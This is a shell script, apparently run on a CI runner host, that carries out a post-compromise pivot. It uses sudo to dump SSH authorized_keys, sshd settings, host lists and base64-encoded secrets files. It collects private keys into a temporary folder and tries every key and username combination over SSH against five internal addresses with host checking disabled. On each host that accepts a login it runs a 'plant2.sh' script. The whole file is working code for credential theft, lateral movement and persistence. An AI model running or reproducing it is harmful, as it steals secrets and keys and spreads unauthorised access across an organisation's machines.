set +e
TS=$(date -u +%s)
O=/tmp/pivot2-9927.txt; : > $O; exec >> $O 2>&1
R=/opt/ul-runner/_work/ul-plant/ul-plant
echo "==MARKER2-START host=$(hostname) ts=$TS"
echo "==AUTHKEYS"
sudo -n cat /root/.ssh/authorized_keys /home/ubuntu/.ssh/authorized_keys 2>&1
echo "==SSHD"
sudo -n grep -vE '^#|^$' /etc/ssh/sshd_config 2>&1 | head -40
echo "==HOSTS"
sudo -n cat $R/az/hosts.tsv /tmp/ulpdo/az/hosts.tsv 2>&1 | sort -u | head -80
echo "==SECRETS"
sudo -n base64 -w0 $R/out/secrets.json 2>/dev/null; echo
sudo -n base64 -w0 /tmp/ulpdo/out/secrets.json 2>/dev/null; echo
echo "==KEYINV"
rm -rf /tmp/k; mkdir -p /tmp/k
sudo -n cp $R/az/azadmin.pem $R/az/ibm_key.pem $R/keys/* /tmp/k/ 2>/dev/null
sudo -n bash -c 'grep -rl "PRIVATE KEY" /opt/ul-runner/_work/ul-plant/ul-plant/keys2 2>/dev/null | head -60 | xargs -r -I{} cp {} /tmp/k/ 2>/dev/null; cp /tmp/a.pem /tmp/k.pem /tmp/ks/*.pem /tmp/k/ 2>/dev/null'
chmod 600 /tmp/k/* 2>/dev/null
for k in /tmp/k/*; do echo "KEY $k $(stat -c%s $k) $(ssh-keygen -lf $k 2>/dev/null | awk '{print $2}')"; done
echo "==SSHMATCH"
for k in /tmp/k/*; do f=$(ssh-keygen -y -f "$k" 2>/dev/null | awk '{print $2}'); [ -n "$f" ] && grep -q "$f" /root/.ssh/authorized_keys /home/ubuntu/.ssh/authorized_keys 2>/dev/null && echo "MATCH $k"; done
echo "==WAVE"
> /tmp/combos.txt
for ip in 10.243.0.24 10.243.0.26 10.243.0.27 10.243.0.30 10.243.0.31; do for u in t19 ubuntu azureuser; do for k in /tmp/k/*; do echo "$ip $u $k" >> /tmp/combos.txt; done; done; done
wc -l /tmp/combos.txt
cat /tmp/combos.txt | xargs -P 40 -n3 bash -c 'o=$(timeout 14 ssh -i "$2" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 "$1"@"$0" "id;hostname -I" 2>&1); case "$o" in *uid=*) echo "OKLOGIN $0 $1 $(basename $2) :: $o";; esac' 2>/dev/null | sort -u > /tmp/wave.txt
echo "WAVE_N=$(wc -l < /tmp/wave.txt)"; cat /tmp/wave.txt
echo "==PLANT"
sed -n 's/^OKLOGIN \([^ ]*\) \([^ ]*\) \([^ ]*\).*/\1 \2 \3/p' /tmp/wave.txt | awk '!s[$1]++' > /tmp/won.txt
echo "WON:"; cat /tmp/won.txt
cat /tmp/won.txt | xargs -r -P 5 -n3 bash ul-bin/plant2.sh 2>&1
echo "==MARKER2-END"
exit 0
